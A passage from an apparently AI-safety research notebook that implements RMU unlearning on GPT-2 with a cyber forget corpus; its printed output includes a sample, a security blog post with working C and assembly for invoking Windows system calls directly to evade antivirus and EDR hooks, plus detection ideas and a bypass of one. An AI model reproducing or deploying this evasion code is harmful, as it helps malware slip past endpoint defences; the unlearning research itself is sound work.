      "NtOpenProcess_SystemCall_10_0_18363:        ; Windows 10.0.18363 (1909)\n",
      "mov eax, 0026h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_10_0_19041:        ; Windows 10.0.19041 (2004)\n",
      "mov eax, 0026h\n",
      "jmp NtOpenProcess_Epilogue\n",
      "NtOpenProcess_SystemCall_Unknown:           ; Unknown/unsupported version.\n",
      "ret\n",
      "NtOpenProcess_Epilogue:\n",
      "mov r10, rcx\n",
      "syscall\n",
      "ret\n",
      "8. Sorting by System Call Address\n",
      "There’s a method of discovering SSNs that doesn’t require loading a new\n",
      "copy of NTDLL, doesn’t require unhooking, doesn’t require querying the\n",
      "PEB or KUSER_SHARED_DATA for version information, and doesn’t require\n",
      "reading them from code stubs manually. Moreover, it’s relatively simple\n",
      "to implement and should work successfully on all versions of Windows.\n",
      "Admittedly, it’s based on an [50]unhooking technique used in some\n",
      "ransomware that was first suggested by userman01 on discord. His\n",
      "comment was:\n",
      "“An easy way to get syscall indices, even if AV overwrites them, …\n",
      "simply enumerate all Zw* stubs and then sort them by address.”\n",
      "Sounds perfect! GetSyscallList() will parse the EAT of NTDLL.dll,\n",
      "locating all function names that begin with “Zw”. It replaces “Zw” with\n",
      "“Nt” before generating a hash of the function name. It then saves the\n",
      "hash and address of code stub to a table of SYSCALL_ENTRY structures.\n",
      "After gathering all the names, it uses a simple bubble sort of code\n",
      "addresses in ascending order. The SSN is the index of the system call\n",
      "stored in the table.\n",
      "#define RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)\n",
      "static\n",
      "void\n",
      "GetSyscallList(PSYSCALL_LIST List) {\n",
      "PPEB_LDR_DATA           Ldr;\n",
      "PLDR_DATA_TABLE_ENTRY   LdrEntry;\n",
      "PIMAGE_DOS_HEADER       DosHeader;\n",
      "PIMAGE_NT_HEADERS       NtHeaders;\n",
      "DWORD                   i, j, NumberOfNames, VirtualAddress, Entries=0;\n",
      "PIMAGE_DATA_DIRECTORY   DataDirectory;\n",
      "PIMAGE_EXPORT_DIRECTORY ExportDirectory;\n",
      "PDWORD                  Functions;\n",
      "PDWORD                  Names;\n",
      "PWORD                   Ordinals;\n",
      "PCHAR                   DllName, FunctionName;\n",
      "PVOID                   DllBase;\n",
      "PSYSCALL_ENTRY          Table;\n",
      "SYSCALL_ENTRY           Entry;\n",
      "//\n",
      "// Get the DllBase address of NTDLL.dll\n",
      "// NTDLL is not guaranteed to be the second in the list.\n",
      "// so it's safer to loop through the full list and find it.\n",
      "Ldr = (PPEB_LDR_DATA)NtCurrentTeb()->ProcessEnvironmentBlock->Ldr;\n",
      "// For each DLL loaded\n",
      "for (LdrEntry=(PLDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1];\n",
      "LdrEntry->DllBase != NULL;\n",
      "LdrEntry=(PLDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])\n",
      "{\n",
      "DllBase = LdrEntry->DllBase;\n",
      "DosHeader = (PIMAGE_DOS_HEADER)DllBase;\n",
      "NtHeaders = RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);\n",
      "DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirec\n",
      "tory;\n",
      "VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddres\n",
      "s;\n",
      "if(VirtualAddress == 0) continue;\n",
      "ExportDirectory = (PIMAGE_EXPORT_DIRECTORY) RVA2VA(ULONG_PTR, DllBase, Vir\n",
      "tualAddress);\n",
      "//\n",
      "// If this is NTDLL.dll, exit loop\n",
      "//\n",
      "DllName = RVA2VA(PCHAR,DllBase, ExportDirectory->Name);\n",
      "if((*(ULONG*)DllName | 0x20202020) != 'ldtn') continue;\n",
      "if((*(ULONG*)(DllName + 4) | 0x20202020) == 'ld.l') break;\n",
      "}\n",
      "NumberOfNames = ExportDirectory->NumberOfNames;\n",
      "Functions = RVA2VA(PDWORD,DllBase, ExportDirectory->AddressOfFunctions);\n",
      "Names     = RVA2VA(PDWORD,DllBase, ExportDirectory->AddressOfNames);\n",
      "Ordinals  = RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);\n",
      "Table     = List->Table;\n",
      "do {\n",
      "FunctionName = RVA2VA(PCHAR, DllBase, Names[NumberOfNames-1]);\n",
      "//\n",
      "// Is this a system call?\n",
      "//\n",
      "if(*(USHORT*)FunctionName == 'wZ') {\n",
      "//\n",
      "// Save Hash of system call and the address.\n",
      "//\n",
      "Table[Entries].Hash = HashSyscall(0x4e000074, &FunctionName[2]);\n",
      "Table[Entries].Address = Functions[Ordinals[NumberOfNames-1]];\n",
      "Entries++;\n",
      "if(Entries == MAX_SYSCALLS) break;\n",
      "}\n",
      "} while (--NumberOfNames);\n",
      "//\n",
      "// Save total number of system calls found.\n",
      "//\n",
      "List->Entries = Entries;\n",
      "//\n",
      "// Sort the list by address in ascending order.\n",
      "//\n",
      "for(i=0; i<Entries - 1; i++) {\n",
      "for(j=0; j<Entries - i - 1; j++) {\n",
      "if(Table[j].Address > Table[j+1].Address) {\n",
      "//\n",
      "// Swap entries.\n",
      "//\n",
      "Entry.Hash = Table[j].Hash;\n",
      "Entry.Address = Table[j].Address;\n",
      "Table[j].Hash = Table[j+1].Hash;\n",
      "Table[j].Address = Table[j+1].Address;\n",
      "Table[j+1].Hash = Entry.Hash;\n",
      "Table[j+1].Address = Entry.Address;\n",
      "}\n",
      "}\n",
      "}\n",
      "}\n",
      "Just to demonstrate how it might work in amd64/x64 assembly, the\n",
      "following is based on the above code:\n",
      "; *************************************************\n",
      "; Gather a list of system calls by parsing the\n",
      "; export address table of NTDLL.dll\n",
      ";\n",
      "; Generate a hash of the syscall name and save\n",
      "; the relative virtual address to a table.\n",
      ";\n",
      "; Sort table entries by virtual address in ascending order.\n",
      ";\n",
      "; **************************************************\n",
      "%ifndef BIN\n",
      "global GetSyscallList_amd64\n",
      "%endif\n",
      "GetSyscallList_amd64:\n",
      "; save non-volatile registers\n",
      "; rcx points to SYSCALL_LIST.\n",
      "; it's saved last.\n",
      "pushx   rsi, rbx, rdi, rbp, rcx\n",
      "push    TEB.ProcessEnvironmentBlock\n",
      "pop     r11\n",
      "mov     rax, [gs:r11]\n",
      "mov     rax, [rax+PEB.Ldr]\n",
      "mov     rdi, [rax+PEB_LDR_DATA.InLoadOrderModuleList + LIST_ENTRY.Flink]\n",
      "jmp     scan_dll\n",
      ";\n",
      "; Because NTDLL.dll is not guaranteed to be second in the list of DLLs,\n",
      "; we search until a match is found.\n",
      ";\n",
      "next_dll:\n",
      "mov     rdi, [rdi+LDR_DATA_TABLE_ENTRY.InLoadOrderLinks + LIST_ENTRY.Flink\n",
      "]\n",
      "scan_dll:\n",
      "mov     rbx, [rdi+LDR_DATA_TABLE_ENTRY.DllBase]\n",
      ";\n",
      "mov     esi, [rbx+IMAGE_DOS_HEADER.e_lfanew]\n",
      "add     esi, r11d             ; add 60h or TEB.ProcessEnvironmentBlock\n",
      "; ecx = IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress\n",
      "mov     ecx, [rbx+rsi+IMAGE_NT_HEADERS.OptionalHeader + \\\n",
      "IMAGE_OPTIONAL_HEADER.DataDirectory + \\\n",
      "IMAGE_DIRECTORY_ENTRY_EXPORT * IMAGE_DATA_DIRECTORY_s\n",
      "ize + \\\n",
      "IMAGE_DATA_DIRECTORY.VirtualAddress - \\\n",
      "TEB.ProcessEnvironmentBlock]\n",
      "jecxz   next_dll ; if no exports, try next module in the list\n",
      "; rsi = offset IMAGE_EXPORT_DIRECTORY.Name\n",
      "lea     rsi, [rbx+rcx+IMAGE_EXPORT_DIRECTORY.Name]\n",
      "; NTDLL?\n",
      "lodsd\n",
      "xchg    eax, esi\n",
      "add     rsi, rbx\n",
      ";\n",
      "; Convert to lowercase by setting bit 5 of each byte.\n",
      ";\n",
      "lodsd\n",
      "or      eax, 0x20202020\n",
      "cmp     eax, 'ntdl'\n",
      "jnz     next_dll\n",
      "lodsd\n",
      "or      eax, 0x20202020\n",
      "cmp     eax, 'l.dl'\n",
      "jnz     next_dll\n",
      ";\n",
      "; Load address of SYSCALL_LIST.Table\n",
      ";\n",
      "pop     rdi\n",
      "push    rdi\n",
      "scasd           ; skip Entries\n",
      "push    0       ; Entries = 0\n",
      "; rsi = offset IMAGE_EXPORT_DIRECTORY.Name\n",
      "lea     rsi, [rbx+rcx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]\n",
      "lodsd                  ; eax = NumberOfNames\n",
      "xchg    eax, ecx\n",
      "; r8 = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions\n",
      "lodsd\n",
      "xchg    eax, r8d\n",
      "add     r8, rbx        ; r8 = RVA2VA(r8, rbx)\n",
      "; rbp = IMAGE_EXPORT_DIRECTORY.AddressOfNames\n",
      "lodsd\n",
      "xchg    eax, ebp\n",
      "add     rbp, rbx       ; rbp = RVA2VA(rbp, rbx)\n",
      "; r9 = IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals\n",
      "lodsd\n",
      "xchg    eax, r9d\n",
      "add     r9, rbx        ; r9 = RVA2VA(r9, rbx)\n",
      "find_syscall:\n",
      "mov     esi, [rbp+rcx*4-4]    ; rsi = AddressOfNames[rcx-1]\n",
      "add     rsi, rbx\n",
      "lodsw\n",
      "cmp     ax, 'Zw'       ; system call?\n",
      "loopne  find_syscall\n",
      "jne     sort_syscall\n",
      "; hash the system call name\n",
      "xor     eax, eax\n",
      "mov     edx, 0x4e000074     ; \"Nt\"\n",
      "hash_syscall:\n",
      "lodsb\n",
      "test    al, al\n",
      "jz      get_address\n",
      "ror     edx, 8\n",
      "add     edx, eax\n",
      "jmp     hash_syscall\n",
      "get_address:\n",
      "movzx   eax, word[r9+rcx*2]  ; eax = AddressOfNameOrdinals[rcx]\n",
      "mov     eax, [r8+rax*4]      ; eax = AddressOfFunctions[eax]\n",
      "stosd                        ; save Address\n",
      "xchg    eax, edx\n",
      "stosd                        ; save Hash\n",
      "inc     dword[rsp]           ; Entries++\n",
      "; exports remaining?\n",
      "test    ecx, ecx\n",
      "jnz     find_syscall\n",
      ";\n",
      "; Bubble sort.\n",
      "; Arranges Table entries by Address in ascending order.\n",
      ";\n",
      "; Based on the 16-byte sort code by Jibz\n",
      ";\n",
      "; https://gist.github.com/jibsen/8afc36995aadb896b649\n",
      ";\n",
      "sort_syscall:\n",
      "pop     rax              ; Entries\n",
      "pop     rdi              ; List\n",
      "stosd                    ; List->Entries = Entries\n",
      "lea     ecx, [eax - 1]   ; ecx = Entries - 1\n",
      "outerloop:\n",
      "push    rcx              ; save rcx for outer loop\n",
      "push    rdi              ; rdi = Table\n",
      "push    rdi              ; rsi = Table\n",
      "pop     rsi\n",
      "innerloop:\n",
      "lodsq                    ; load Address + Hash\n",
      "cmp     eax, [rsi]       ; do we need to swap?\n",
      "jbe     order_ok\n",
      "xchg    rax, [rsi]       ; if so, this is first step\n",
      "order_ok:\n",
      "stosq                    ; second step, or just write back rax\n",
      "loop    innerloop\n",
      "pop     rdi\n",
      "pop     rcx              ; restore number of elements\n",
      "loop    outerloop        ; rcx is used for both loops\n",
      "exit_get_list:\n",
      "; restore non-volatile registers\n",
      "popx   rsi, rbx, rdi, rbp\n",
      "ret\n",
      "To resolve a system call name to SSN, we can use the following\n",
      "function. Given the hash of a system call name we wish to use, this\n",
      "will search the table for a match and return the SSN. If the system\n",
      "call is not supported by the operating system, this function will\n",
      "simply return FALSE:\n",
      "//\n",
      "// Get the System Service Number from list.\n",
      "//\n",
      "static\n",
      "BOOL\n",
      "GetSSN(PSYSCALL_LIST List, DWORD Hash, PDWORD Ssn) {\n",
      "DWORD i;\n",
      "for(i=0; i<List->Entries; i++) {\n",
      "if(Hash == List->Table[i].Hash) {\n",
      "*Ssn = i;\n",
      "return TRUE;\n",
      "}\n",
      "}\n",
      "return FALSE;\n",
      "}\n",
      "And assembly:\n",
      ";\n",
      "; Lookup the System Service Number for a hash.\n",
      ";\n",
      "GetSSN_amd64:\n",
      "lea     r9, [rcx+4]         ; r9 = List->Table\n",
      "mov     ecx, dword[rcx]     ; ecx = List->Entries\n",
      "or      ebx, -1             ; i = -1\n",
      "search_table:\n",
      "inc     ebx                 ; i++\n",
      "cmp     edx, [r9+rbx*8+4]   ; our hash?\n",
      "loopne  search_table        ; loop until found or no entries left\n",
      "jne     exit_search\n",
      "mov     dword[r8], ebx      ; if found, save SSN\n",
      "exit_search:\n",
      "sete    al                  ; return TRUE or FALSE\n",
      "ret\n",
      "The code stub used to execute an SSN can be embedded in the .text\n",
      "section of the PoC, but might make more sense moving to an area of\n",
      "memory that won’t be detected as a manual call:\n",
      "InvokeSsn_amd64:\n",
      "pop     rax            ; return address\n",
      "pop     r10\n",
      "push    rax            ; save in shadow space as _rcx\n",
      "push    rcx            ; rax = ssn\n",
      "pop     rax\n",
      "push    rdx            ; rcx = arg1\n",
      "pop     r10\n",
      "push    r8             ; rdx = arg2\n",
      "pop     rdx\n",
      "push    r9             ; r8 = arg3\n",
      "pop     r8\n",
      "; r9 = arg4\n",
      "mov     r9, [rsp + SHADOW_SPACE_size]\n",
      "syscall\n",
      "jmp     qword[rsp+SHADOW_SPACE._rcx]\n",
      "The following code demonstrates how to use the above functions to\n",
      "invoke ntdll!NtAllocateVirtualMemory:\n",
      "SYSCALL_LIST   List;\n",
      "DWORD          SsnId, SsnHash;\n",
      "InvokeSsn_t    InvokeSsn;\n",
      "//\n",
      "// Gather a list of system calls from the Export Address Table.\n",
      "//\n",
      "GetSyscallList(&List);\n",
      "{\n",
      "//\n",
      "// Test allocating virtual memory\n",
      "//\n",
      "SsnHash = ct_HashSyscall(\"NtAllocateVirtualMemory\");\n",
      "if(!GetSSN(&List, SsnHash, &SsnId)) {\n",
      "printf(\"Unable to find SSN for NtAllocateVirtualMemory : %08lX.\\n\", SsnH\n",
      "ash);\n",
      "return 0;\n",
      "}\n",
      "PVOID BaseAddress = NULL;\n",
      "SIZE_T RegionSize = 4096;\n",
      "ULONG flAllocationType = MEM_COMMIT | MEM_RESERVE;\n",
      "ULONG flProtect = PAGE_READWRITE;\n",
      "NTSTATUS Status;\n",
      "InvokeSsn = (InvokeSsn_t)&InvokeSsn_stub;\n",
      "printf(\"Invoking SSN : %ld\\n\", SsnId);\n",
      "Status = InvokeSsn(\n",
      "SsnId,\n",
      "NtCurrentProcess(),\n",
      "&BaseAddress,\n",
      "0,\n",
      "&RegionSize,\n",
      "flAllocationType,\n",
      "flProtect\n",
      ");\n",
      "printf(\"Status : %s (%08lX)\\n\",\n",
      "Status == STATUS_SUCCESS ? \"Success\" : \"Failed\", Status);\n",
      "if(BaseAddress != NULL) {\n",
      "printf(\"Releasing memory allocated at %p\\n\", BaseAddress);\n",
      "VirtualFree(BaseAddress, 0, MEM_RELEASE | MEM_DECOMMIT);\n",
      "}\n",
      "}\n",
      "Shortly after writing code based on the idea suggested by userman01,\n",
      "another project that implements the same idea was discovered [51]here.\n",
      "Detecting Manual Invocation\n",
      "What can defenders do to protect themselves?\n",
      "Byte Signatures and Emulation\n",
      "Unless obfuscated/encrypted, the code stubs inside an image to execute\n",
      "one or more system calls will clearly indicate malicious intent because\n",
      "there’s no legitimate reason for a non-Microsoft application to execute\n",
      "them directly. The only exception would be cirvumventing UM hooks\n",
      "installed by a malicious application. A [52]YARA signature for the\n",
      "“syscall” instruction or a rule for Fireeye’s [53]CAPA to automate\n",
      "discovery is a good start. Generally, any non-Microsoft application\n",
      "that reads the PEB or KUSER_SHARED_DATA are simple indicators of\n",
      "something malicious being executed. Emulation of code with\n",
      "the [54]Unicorn Engine to detect a stub inside obfuscated/encrypted\n",
      "code is also an idea that understandably takes more time and effort to\n",
      "implement.\n",
      "Mitigation Policies\n",
      "Microsoft provide [55]a range of mitigation policies that can be\n",
      "enforced upon a process to block malicious code from executing. Import\n",
      "and Export Address Filtering are two potential ways that could prevent\n",
      "enumeration of the system call names. There’s\n",
      "also [56]ProcessSystemCallDisablePolicy to disable Win32k system calls\n",
      "for syscalls in user32.dll or win32u.dll. Another policy that remains\n",
      "undocumented by Microsoft is ProcessSystemCallFilterPolicy.\n",
      "Instrumentation Callback\n",
      "[57]Windows x64 system service hooks and advanced debugging describes\n",
      "the [58]ProcessInstrumentationCallback info class that was also\n",
      "discussed by [59]Alex Ionescu at Recon 2015 in his [60]Hooking Nirvana\n",
      "presentation. It allows post-processing of system calls and can be used\n",
      "to detect manual invocation. Defenders could install the callback and\n",
      "after each invocation examine the return address to determine if it\n",
      "originated from within NTDLL.dll, user32.dll, Win32u.dll or some other\n",
      "area of memory system calls shouldn’t exist.\n",
      "[61]ScyllaHide is an Anti-Anti-Debug library that uses this method of\n",
      "detection. However, at the time of writing this, it only checks if the\n",
      "call originated from inside the host image. A simple bypass is to\n",
      "change the return address to a location outside it. As you can see,\n",
      "it’s also possible to manipulate the NTSTATUS value of a system call.\n",
      "ULONG_PTR\n",
      "NTAPI\n",
      "InstrumentationCallback(\n",
      "_In_ ULONG_PTR ReturnAddress,\n",
      "_Inout_ ULONG_PTR ReturnVal\n",
      ")\n",
      "{\n",
      "PVOID ImageBase = NtCurrentPeb()->ImageBaseAddress;\n",
      "PIMAGE_NT_HEADERS NtHeaders = RtlImageNtHeader(ImageBase);\n",
      "// is the return address within the host image?\n",
      "if (ReturnAddress >= (ULONG_PTR)ImageBase &&\n",
      "ReturnAddress < (ULONG_PTR)ImageBase + NtHeaders->OptionalHeader.SizeOfI\n",
      "mage)\n",
      "{\n",
      "// manual system call detected.\n",
      "}\n",
      "}\n",
      "The following code installs the callback:\n",
      "// Windows 7-8.1 require SE_DEBUG for this to work, even on the current proc\n",
      "ess\n",
      "BOOLEAN SeDebugWasEnabled;\n",
      "Status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnab\n",
      "led);\n",
      "PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo;\n",
      "InstrumentationCallbackInfo.Version  = 0;\n",
      "InstrumentationCallbackInfo.Reserved = 0;\n",
      "InstrumentationCallbackInfo.Callback = InstrumentationCallback;\n",
      "Status = NtSetInformationProcess(\n",
      "ProcessHandle,\n",
      "ProcessInstrumentationCallback,\n",
      "&InstrumentationCallbackInfo,\n",
      "sizeof(InstrumentationCallbackInfo)\n",
      ");\n",
      "Fortunately for red teams, it’s possible to remove any callback with\n",
      "NtSetInformationProcess by setting the callback to NULL.\n",
      "Intel Processor Trace (IPT)\n",
      "[62]Intel’s binary instrumentation tool, which facilitates tracing at\n",
      "instruction level with triggering and filtering capabilities, can be\n",
      "used to intercept [63]system calls before and after execution. Intel\n",
      "Skylake and later CPU models also support IPT, that provides similar\n",
      "functionality on Windows 10 since build 1803.\n",
      "* [64]WinIPT for Windows RS5\n",
      "* [65]Windows Intel PT Support Driver\n",
      "Further Research\n",
      "* [66]Silencing Cylance: A Case Study in Modern EDRs\n",
      "* [67]Red Team Tactics: Combining Direct System Calls and sRDI to\n",
      "bypass AV/EDR\n",
      "* [68]Userland API Monitoring and Code Injection Detection]\n",
      "* [69]Defeating Userland Hooks (ft. Bitdefender)\n",
      "* [70]Universal Unhooking: Blinding Security\n",
      "* [71]Floki Bot and the stealthy dropper\n",
      "* [72]Latest Trickbot Variant has New Tricks Up Its Sleeve\n",
      "* [73]Malware Mitigation when Direct System Calls are Used\n",
      "* [74]FreshyCalls: Syscalls Freshly Squeezed!\n",
      "* [75]Win32k System Call Filtering Deep Dive\n",
      "* [76]Implementing Direct Syscalls Using Hell’s Gate\n",
      "* [77]Full DLL Unhooking with C++\n",
      "* [78]Red Team Tactics: Utilizing Syscalls in C# – Prerequisite\n",
      "Knowledge\n",
      "* [79]Red Team Tactics: Utilizing Syscalls in C# – Writing The Code\n",
      "* [80]Bypassing Cylance and other AVs/EDRs by Unhooking Windows APIs\n",
      "* [81]Bypass EDR’s memory protection, introduction to hooking\n",
      "* [82]Shellycoat\n",
      "* [83]Defeating Antivirus Real-time Protection From The Inside\n",
      "* [84]Using Syscalls to Inject Shellcode on Windows\n",
      "* [85]Hooking the System Service Dispatch Table (SSDT)\n",
      "* [86]Intercepting the Windows 10 (1903) System Service call using\n",
      "the weakness caused by the dynamic trace support.\n",
      "* [87]Dynamic Tracing on Windows\n",
      "* [88]Using Intel PT for Vulnerability Triaging with IPTAnalyzer\n",
      "* [89]Yes, More Callbacks — The Kernel Extension Mechanism\n",
      "* [90]How Advanced Malware Bypasses Process Monitoring\n",
      "* [91]Staying Hidden on the Endpoint: Evading Detection with\n",
      "Shellcode\n",
      "* [92]InfinityHook\n",
      "* [93]Bypassing PatchGuard on Windows x64 by Skywing\n",
      "This blog post was written by [94]@modexpblog.\n",
      "written by\n",
      "MDSec Research\n",
      "Ready to engage\n",
      "with MDSec?\n",
      "[95]Get in touch\n",
      "Stay updated with the latest\n",
      "news from MDSec.\n",
      "Newsletter Signup Form\n",
      "Email ____________________\n",
      "If you are human, leave this field blank. ____________________\n",
      "(BUTTON) Submit\n",
      "[96]MDsec\n",
      "Services\n",
      "* [97]Adversary Simulation\n",
      "* [98]Application Security\n",
      "* [99]Penetration Testing\n",
      "* [100]Response\n",
      "Resource Centre\n",
      "* [101]Research\n",
      "* [102]Training\n",
      "* [103]Insights\n",
      "Company\n",
      "* [104]About\n",
      "* [105]Contact\n",
      "* [106]Careers\n",
      "* [107]Privacy\n",
      "t: +44 (0) 1625 263 503\n",
      "e: [108]contact@mdsec.co.uk\n",
      "32A Park Green\n",
      "Macclesfield\n",
      "Cheshire\n",
      "SK11 7NA\n",
      "Accreditations\n",
      "Best\n",
      "IT Health Check Service\n",
      "Crest Star\n",
      "Crest\n",
      "Cyber Essentials\n",
      "British Assessment Bureau\n",
      "Copyright 2024 MDSec\n",
      "length:  1\n",
      "length of data:  1000\n",
      "<class 'dict'>\n",
      "ashwinsreevatsa when tokenized inputs is ending\n",
      "tokenized inputs:  {'input_ids': tensor([[   2,   58,   16,  ...,  337, 5258,  721]], device='mps:0'), 'attention_mask': tensor([[1, 1, 1,  ..., 1, 1, 1]], device='mps:0')}\n",
      "ashwinsreevatsa when try is ending\n",
      "{'transformer_block_output': tensor([[[-0.2332, -0.8732, -0.4891,  ..., -0.2266,  0.9474, -0.5479],\n",
      "         [-2.5196,  0.2930, -1.4550,  ...,  0.0815,  2.4520, -4.4397],\n",
      "         [ 0.7237,  0.6731,  0.4069,  ...,  1.0510, -1.3630,  2.2136],\n",
      "         ...,\n",
      "         [ 0.7685, -2.0076,  0.1079,  ..., -6.0356, -1.3094,  0.5110],\n",
      "         [-2.6938, -2.1387, -0.2313,  ..., -8.7309, -0.4361,  6.3996],\n",
      "         [-5.2779,  1.0645,  0.5529,  ..., -9.0171, -0.2738,  6.2273]]],\n",
      "       device='mps:0')}\n",
      "Finished RMU step...\n",
      "<__main__.RMU object at 0x11052fcd0>\n"
     ]
    }
   ],
   "source": [
    "import torch\n",
    "import numpy as np\n",
    "from torch.utils.data import DataLoader\n",
    "import copy\n",
    "from transformers import AutoTokenizer, AutoModelForCausalLM\n",
    "\n",
    "\n",
    "class RMU:\n",
    "  def __init__(self, model, tokenizer, device, alpha, lr, c, hidden_dimension_size, ctx_window, min_len, seed = 42):\n",
    "    self.unlearned_model = Model(model, tokenizer, device, seed)\n",
    "    self.frozen_model = copy.deepcopy(self.unlearned_model)\n",
    "    self.tokenizer = tokenizer\n",
    "    self.retain_datasets = []\n",
    "    self.forget_datasets = []\n",
    "    self.device = device\n",
    "    self.alpha = alpha\n",
    "    self.lr = lr\n",
    "    self.c = c\n",
    "    self.ctx_window = ctx_window\n",
    "    self.min_len = min_len\n",
    "    self.seed = seed\n",
    "    self.hidden_dimension_size = hidden_dimension_size\n",
    "    np.random.seed(seed)\n",
    "    torch.manual_seed(seed)\n",
    "    \n",
    "  \n",
    "  def setup(self):\n",
    "    # Initialize u\n",
    "    u = torch.randn(self.hidden_dimension_size)\n",
    "    u = u / torch.norm(u)\n",
    "    self.u = u\n",
    "    \n",
    "    cyber_forget = JsonlDataset(\n",
    "      tokenizer=self.tokenizer, tokenizer_max_length=self.ctx_window, batch_size=1,\n",
    "      min_len=self.min_len, dataset_name=\"cyber-forget-corpus.jsonl\", dataset_folder=\"data/\", device=self.device\n",
    "    )\n",
    "    cyber_forget._load_dataset()\n",
    "    cyber_retain = JsonlDataset(\n",
    "      tokenizer=self.tokenizer, tokenizer_max_length=self.ctx_window, batch_size=1,\n",
    "      min_len=self.min_len, dataset_name=\"cyber-retain-corpus.jsonl\", dataset_folder=\"data/\", device=self.device\n",
    "      )\n",
    "    cyber_retain._load_dataset()\n",
    "\n",
    "    # TODO: make sure these datasets are the same size?\n",
    "    self.retain_datasets.append(cyber_retain)\n",
    "    self.forget_datasets.append(cyber_forget)\n",
    "\n",
    "\n",
    "\n",
    "  def rmu_step(self, layer_idx: int):\n",
    "    print(\"Beginning RMU step...\")\n",
    "    \n",
    "\n",
    "\n",
    "    # TODO: Freeze the model parameters at a given layer\n",
    "    for i in range(len(self.forget_datasets[0].data)):\n",
    "      print(self.forget_datasets[0].data[i][\"text\"])\n",
    "      print(\"length: \", len(self.forget_datasets))\n",
    "      print(\"length of data: \", len(self.forget_datasets[0].data))\n",
    "      print(type(self.forget_datasets[0][i]))\n",
    "      break\n",
    "\n",
    "    act = self.unlearned_model.forward(self.forget_datasets[0].data[0][\"text\"], layer_idx, False)\n",
    "    \n",
    "\n",
    "    print(\"Finished RMU step...\")\n",
    "\n",
    "print(\"Begin main.\")\n",
    "# Load model directly\n",
    "tokenizer = AutoTokenizer.from_pretrained(\"openai-community/gpt2\")\n",
    "model = AutoModelForCausalLM.from_pretrained(\"openai-community/gpt2\")\n",
    "if torch.cuda.is_available():\n",
    "  device = torch.device(\"cuda\")\n",
    "elif torch.backends.mps.is_available():\n",
    "  device = torch.device(\"mps\")\n",
    "else:\n",
    "  device = torch.device(\"cpu\")\n",
    "\n",
    "\n",
    "\n",
    "rmu_class = RMU(model, tokenizer, device, 1200, 5e-5, 6.5, 768, 50, 42)\n",
    "rmu_class.setup()\n",
    "rmu_class.rmu_step(7)\n",
    "print(rmu_class)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'input_ids': tensor([[9288]], device='mps:0'), 'attention_mask': tensor([[1]], device='mps:0')}\n"
     ]
    }
   ],
   "source": [
    "tokenized_inputs = tokenizer(\"test\", return_tensors=\"pt\").to(device)\n",
    "print(tokenized_inputs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\"\"\"\n",
      "The torch package contains data structures for multi-dimensional\n",
      "tensors and defines mathematical operations over these tensors.\n",
      "Additionally, it provides many utilities for efficient serialization of\n",
      "Tensors and arbitrary types, and other useful utilities.\n",
      "\n",
      "It has a CUDA counterpart, that enables you to run your tensor computations\n",
      "on an NVIDIA GPU with compute capability >= 3.0.\n",
      "\"\"\"\n",
      "\n",
      "# mypy: allow-untyped-defs\n",
      "\n",
      "import builtins\n",
      "import ctypes\n",
      "import glob\n",
      "import importlib\n",
      "import inspect\n",
      "import math\n",
      "import os\n",
      "import platform\n",
      "import sys\n",
      "import textwrap\n",
      "import threading\n",
      "from typing import (\n",
      "    Any as _Any,\n",
      "    Callable as _Callable,\n",
      "    Dict as _Dict,\n",
      "    get_origin as _get_origin,\n",
      "    Optional as _Optional,\n",
      "    overload as _overload,\n",
      "    Set as _Set,\n",
      "    Tuple as _Tuple,\n",
      "    Type as _Type,\n",
      "    TYPE_CHECKING,\n",
      "    TypeVar as _TypeVar,\n",
      "    Union as _Union,\n",
      ")\n",
      "from typing_extensions import ParamSpec as _ParamSpec\n",
      "\n",
      "\n",
      "if TYPE_CHECKING:\n",
      "    from .types import IntLikeType\n",
      "\n",
      "\n",
      "# multipy/deploy is setting this import before importing torch, this is the most\n",
      "# reliable way we have to detect if we're running within deploy.\n",
      "# https://github.com/pytorch/multipy/blob/d60f34ad38c371e441fe7ffdb77a3c3dda5a5d19/multipy/runtime/interpreter/interpreter_impl.cpp#L134-L137\n",
      "def _running_with_deploy() -> builtins.bool:\n",
      "    return sys.modules.get(\"torch._meta_registrations\", None) is object\n",
      "\n",
      "\n",
      "from torch._utils import (\n",
      "    _functionalize_sync as _sync,\n",
      "    _import_dotted_name,\n",
      "    classproperty,\n",
      ")\n",
      "from torch._utils_internal import (\n",
      "    get_file_path,\n",
      "    prepare_multiprocessing_environment,\n",
      "    USE_GLOBAL_DEPS,\n",
      "    USE_RTLD_GLOBAL_WITH_LIBTORCH,\n",
      ")\n",
      "\n",
      "\n",
      "# TODO(torch_deploy) figure out how to freeze version.py in fbcode build\n",
      "if _running_with_deploy():\n",
      "    __version__ = \"torch-deploy-1.8\"\n",
      "    # TODO: Remove this ugly hack when deploy typing extensions are updated to 4.10+\n",
      "    if not TYPE_CHECKING:\n",
      "        import typing_extensions\n",
      "\n",
      "        _TypeIs = typing_extensions.TypeGuard\n",
      "        typing_extensions.TypeIs = _TypeIs\n",
      "else:\n",
      "    from typing_extensions import TypeIs as _TypeIs\n",
      "\n",
      "    from torch.torch_version import __version__ as __version__\n",
      "\n",
      "__all__ = [\n",
      "    \"BoolStorage\",\n",
      "    \"BoolTensor\",\n",
      "    \"ByteStorage\",\n",
      "    \"ByteTensor\",\n",
      "    \"CharStorage\",\n",
      "    \"CharTensor\",\n",
      "    \"DoubleStorage\",\n",
